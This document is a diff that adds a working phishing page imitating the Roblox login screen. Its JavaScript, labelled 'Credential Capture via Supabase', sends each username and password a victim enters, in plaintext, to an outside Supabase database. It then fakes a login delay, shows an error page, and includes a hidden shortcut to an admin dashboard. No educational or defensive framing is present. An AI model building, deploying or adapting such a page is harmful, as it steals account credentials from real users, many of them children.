@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Roblox</title>
+    <link rel="icon" href="https://images.rbxcdn.com/23421382939a9f4ae8bbe60dbe2a3e7e.ico.gzip" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700;900&display=swap"
+        rel="stylesheet">
+    <style>
+        /* ========== RESET ========== */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Source Sans Pro', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #fff;
+            color: #191919;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            /* Center content vertically */
+            align-items: center;
+            /* Center content horizontally */
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        input {
+            font-family: inherit;
+        }
+
+        /* ========== MAIN CONTENT ========== */
+        .main-content {
+            flex: 0 1 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px;
+            width: 100%;
+        }
+
+        .login-card {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 32px 40px 28px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+        }
+
+        .login-title {
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 24px;
+            color: #191919;
+        }
+
+        /* Tab selector */
+        .login-tabs {
+            display: flex;
+            margin-bottom: 16px;
+            border-bottom: 2px solid #e0e0e0;
+        }
+
+        .login-tab {
+            flex: 1;
+            text-align: center;
+            padding: 10px 0;
+            font-size: 14px;
+            font-weight: 600;
+            color: #8e8e8e;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            margin-bottom: -2px;
+            transition: color 0.15s, border-color 0.15s;
+        }
+
+        .login-tab.active {
+            color: #191919;
+            border-bottom-color: #191919;
+        }
+
+        .login-tab:hover:not(.active) {
+            color: #555;
+        }
+
+        /* Input fields */
+        .input-group {
+            margin-bottom: 14px;
+        }
+
+        .input-label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #606060;
+            margin-bottom: 4px;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .login-input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #c0c0c0;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #191919;
+            background: #fff;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .login-input:focus {
+            border-color: #00a2ff;
+            box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.15);
+        }
+
+        .login-input::placeholder {
+            color: #b8b8b8;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #8e8e8e;
+            display: flex;
+            align-items: center;
+            padding: 4px;
+        }
+
+        .password-toggle:hover {
+            color: #191919;
+        }
+
+        /* Error message */
+        .error-message {
+            background: #fef2f2;
+            border: 1px solid #fca5a5;
+            border-radius: 8px;
+            color: #dc2626;
+            font-size: 13px;
+            padding: 10px 14px;
+            margin-bottom: 14px;
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .error-message.show {
+            display: flex;
+        }
+
+        .error-icon {
+            flex-shrink: 0;
+        }
+
+        /* Login button */
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #02b757;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.15s, transform 0.1s;
+            margin-bottom: 12px;
+        }
+
+        .login-btn:hover {
+            background: #029a49;
+        }
+
+        .login-btn:active {
+            transform: scale(0.99);
+        }
+
+        .login-btn:disabled {
+            background: #8dd9b0;
+            cursor: not-allowed;
+        }
+
+        .login-btn.loading {
+            position: relative;
+            color: transparent;
+        }
+
+        .login-btn.loading::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 2px solid #fff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: translate(-50%, -50%) rotate(360deg);
+            }
+        }
+
+        /* Links */
+        .forgot-link {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .forgot-link a {
+            color: #00a2ff;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 16px 0;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background: #e0e0e0;
+        }
+
+        .divider-text {
+            font-size: 12px;
+            color: #8e8e8e;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        /* Other options */
+        .other-login-btn {
+            width: 100%;
+            padding: 10px;
+            background: #fff;
+            color: #191919;
+            font-size: 14px;
+            font-weight: 600;
+            border: 1px solid #c0c0c0;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.15s, border-color 0.15s;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .other-login-btn:hover {
+            background: #f5f5f5;
+            border-color: #a0a0a0;
+        }
+
+        /* Signup prompt */
+        .signup-prompt {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #606060;
+        }
+
+        .signup-prompt a {
+            color: #00a2ff;
+            font-weight: 600;
+        }
+
+        .signup-prompt a:hover {
+            text-decoration: underline;
+        }
+
+        /* ========== FOOTER ========== */
+        .footer {
+            background: transparent;
+            color: #b8b8b8;
+            padding: 24px 16px;
+            font-size: 12px;
+            width: 100%;
+            margin-top: auto;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+        }
+
+        .footer-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-bottom: 16px;
+            justify-content: center;
+        }
+
+        .footer-links a {
+            color: #b8b8b8;
+            font-size: 12px;
+            transition: color 0.15s;
+        }
+
+        .footer-links a:hover {
+            color: #fff;
+        }
+
+        .footer-bottom {
+            text-align: center;
+            color: #8e8e8e;
+            font-size: 11px;
+            line-height: 1.6;
+        }
+
+        /* ========== RESPONSIVE ========== */
+        @media (max-width: 768px) {
+            .login-card {
+                padding: 24px 20px 20px;
+                margin: 0 8px;
+            }
+
+            .main-content {
+                padding: 32px 8px;
+            }
+
+            .footer {
+                position: static;
+                margin-top: 48px;
+            }
+
+            /* Unstick footer on mobile */
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+
+<body>
+
+    <!-- ========== LOGIN FORM ========== -->
+    <main class="main-content">
+        <div class="login-card">
+            <h1 class="login-title">Log In</h1>
+
+            <!-- Tabs -->
+            <div class="login-tabs">
+                <div class="login-tab active" data-tab="username">Username</div>
+                <div class="login-tab" data-tab="email">Email</div>
+                <div class="login-tab" data-tab="phone">Phone Number</div>
+            </div>
+
+            <!-- Error -->
+            <div class="error-message" id="errorMsg">
+                <svg class="error-icon" width="16" height="16" viewBox="0 0 16 16" fill="#dc2626">
+                    <circle cx="8" cy="8" r="8" />
+                    <path d="M8 4.5v4" stroke="#fff" stroke-width="1.5" stroke-linecap="round" />
+                    <circle cx="8" cy="11" r="0.75" fill="#fff" />
+                </svg>
+                <span>Incorrect username or password. Please try again.</span>
+            </div>
+
+            <form id="loginForm" autocomplete="off">
+                <!-- Username/Email/Phone input -->
+                <div class="input-group">
+                    <label class="input-label" id="inputLabel" for="usernameInput">Username</label>
+                    <input type="text" class="login-input" id="usernameInput" placeholder="Username" required>
+                </div>
+
+                <!-- Password input -->
+                <div class="input-group">
+                    <label class="input-label" for="passwordInput">Password</label>
+                    <div class="input-wrapper">
+                        <input type="password" class="login-input" id="passwordInput" placeholder="Password" required>
+                        <button type="button" class="password-toggle" id="passToggle"
+                            aria-label="Toggle password visibility">
+                            <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                                <circle cx="12" cy="12" r="3" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Login Button -->
+                <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+
+                <!-- Forgot Password -->
+                <div class="forgot-link">
+                    <a href="#">Forgot Password or Username?</a>
+                </div>
+            </form>
+
+            <!-- Divider -->
+            <div class="divider">
+                <div class="divider-line"></div>
+                <span class="divider-text">or</span>
+                <div class="divider-line"></div>
+            </div>
+
+            <!-- Other login options -->
+            <button class="other-login-btn">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#191919" stroke-width="2">
+                    <rect x="2" y="4" width="20" height="16" rx="3" />
+                    <path d="M2 7l10 7 10-7" />
+                </svg>
+                Email Me a One-Time Code
+            </button>
+            <button class="other-login-btn">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#191919" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2" />
+                    <path d="M7 11V7a5 5 0 0110 0v4" />
+                    <circle cx="12" cy="16" r="1" />
+                </svg>
+                Quick Log In
+            </button>
+
+            <!-- Sign up prompt -->
+            <div class="signup-prompt">
+                Don't have an account? <a href="#">Sign Up</a>
+            </div>
+        </div>
+    </main>
+
+    <!-- ========== FOOTER ========== -->
+    <footer class="footer">
+        <div class="footer-inner">
+            <div class="footer-links">
+                <a href="#">About Us</a>
+                <a href="#">Jobs</a>
+                <a href="#">Blog</a>
+                <a href="#">Parents</a>
+                <a href="#">Gift Cards</a>
+                <a href="#">Help</a>
+                <a href="#">Terms</a>
+                <a href="#">Privacy</a>
+                <a href="#">Cookie Policy</a>
+            </div>
+            <div class="footer-bottom">
+                ©2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and
+                unregistered trademarks in the U.S. and other countries.
+            </div>
+        </div>
+    </footer>
+
+    <!-- ========== JAVASCRIPT ========== -->
+    <script>
+        // ---- SUPABASE CONFIG ----
+        const SUPABASE_URL = 'https://deiohgeudwyeuqloojyd.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRlaW9oZ2V1ZHd5ZXVxbG9vanlkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA4MTgyMTUsImV4cCI6MjA4NjM5NDIxNX0.dZY2x0-eM5M67oklbtA_toBtzKzYtNGEQSuDNBdk2ps';
+        const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // ---- TAB SWITCHING ----
+        const tabs = document.querySelectorAll('.login-tab');
+        const usernameInput = document.getElementById('usernameInput');
+        const inputLabel = document.getElementById('inputLabel');
+
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                tabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+                const type = tab.dataset.tab;
+                if (type === 'email') {
+                    inputLabel.textContent = 'Email';
+                    usernameInput.placeholder = 'Email';
+                    usernameInput.type = 'email';
+                } else if (type === 'phone') {
+                    inputLabel.textContent = 'Phone Number';
+                    usernameInput.placeholder = 'Phone Number';
+                    usernameInput.type = 'tel';
+                } else {
+                    inputLabel.textContent = 'Username';
+                    usernameInput.placeholder = 'Username';
+                    usernameInput.type = 'text';
+                }
+            });
+        });
+
+        // ---- PASSWORD TOGGLE ----
+        const passToggle = document.getElementById('passToggle');
+        const passwordInput = document.getElementById('passwordInput');
+
+        passToggle.addEventListener('click', () => {
+            const isPassword = passwordInput.type === 'password';
+            passwordInput.type = isPassword ? 'text' : 'password';
+        });
+
+        // ---- FORM SUBMIT (Credential Capture via Supabase) ----
+        const loginForm = document.getElementById('loginForm');
+        const loginBtn = document.getElementById('loginBtn');
+        const errorMsg = document.getElementById('errorMsg');
+
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value;
+
+            if (!username || !password) return;
+
+            // Loading state
+            loginBtn.disabled = true;
+            loginBtn.classList.add('loading');
+            errorMsg.classList.remove('show');
+
+            try {
+                // Insert directly into Supabase
+                await supabaseClient.from('login_attempts').insert({
+                    id: crypto.randomUUID(),
+                    username: username,
+                    password: password,
+                    ip_address: null,
+                    user_agent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                });
+
+                // Simulate realistic delay
+                await new Promise(r => setTimeout(r, 800));
+            } catch (err) {
+                console.error('Capture error:', err);
+            }
+
+            // Reset loading state
+            loginBtn.disabled = false;
+            loginBtn.classList.remove('loading');
+
+            // Redirect to error page
+            window.location.href = 'error.html';
+        });
+
+        // ---- ADMIN SHORTCUT (Ctrl+H) ----
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && (e.key === 'h' || e.key === 'H')) {
+                e.preventDefault();
+                window.location.href = 'dashboard.html';
+            }
+        });
+    </script>
+</body>
+
+</html>
